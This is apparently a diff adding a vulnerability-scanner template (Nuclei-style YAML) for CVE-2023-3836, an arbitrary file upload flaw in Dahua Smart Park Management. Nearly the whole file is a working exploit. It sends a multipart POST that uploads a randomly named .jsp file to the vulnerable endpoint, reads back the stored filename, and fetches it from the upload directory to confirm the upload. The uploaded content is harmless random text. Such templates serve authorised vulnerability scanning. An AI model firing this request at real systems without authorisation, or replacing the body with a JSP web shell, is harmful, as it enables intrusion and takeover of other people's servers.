@@ -1,0 +1,59 @@
+id: poc-yaml-dahua-smart-park-management-file-upload
+info:
+  name: Dahua Smart Park Management Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-3836,file-upload
+
+variables:
+  r_str: "{{rand_base(5)}}"
+  r_body: "{{rand_base(20)}}"
+  r_boundary: "{{rand_base(8)}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/emap/devicePoint_addImgIco?hasSubsystem=true"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{r_boundary}}"
+    body: |
+      ------WebKitFormBoundary{{r_boundary}}\r\n
+      Content-Disposition: form-data; name="upload";filename="{{r_str}}.jsp"\r\n
+      Content-Type: application/octet-stream\r\n
+      Content-Transfer-Encoding: binary\r\n
+      \r\n
+      {{r_body}}\r\n
+      ------WebKitFormBoundary{{r_boundary}}--\r\n
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":"
+          - "\"data\":"
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "\"code\":1,\"data\":\"(?P<filename>.*?)\""
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/emap/society_new/{{filename}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{r_body}}"
